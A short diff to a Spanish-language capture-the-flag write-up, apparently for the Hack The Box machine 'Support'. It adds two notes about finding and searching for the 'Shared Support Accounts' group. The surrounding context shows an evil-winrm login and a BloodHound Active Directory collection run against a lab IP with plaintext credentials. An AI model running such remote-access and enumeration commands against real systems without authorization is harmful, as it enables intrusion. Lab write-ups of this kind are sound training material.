@@ -238,6 +238,7 @@ Viendo que si pertenece y pudiéndonos conectar al usuario usando la herramienta
 evil-winrm -i 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
 ```
 
+Al enumerar los grupos encontramos uno llamado `Shared Support Accounts`
 # Escalada de privilegios
 ### BloodHound
 
@@ -246,4 +247,5 @@ Usaremos la herramienta de [[BLOODHOUND]] para extraer toda la información posi
 bloodhound-python -d support.htb -ns 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful' -c ALL --zip
 ```
 
+Buscaremos por el grupo encontrado anteriormente
 
